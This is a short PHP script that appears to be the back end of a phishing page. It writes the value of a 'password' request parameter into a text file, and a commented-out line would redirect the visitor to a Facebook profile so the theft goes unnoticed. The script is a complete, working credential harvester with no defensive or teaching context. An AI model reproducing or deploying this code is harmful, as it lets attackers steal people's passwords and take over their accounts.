<?php

$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$txt = $_GET['password'];
fwrite($myfile, $txt);

fclose($myfile);

//header("Location: https://www.facebook.com/profile.php?id=100001295764354&fref=ts");
?> 
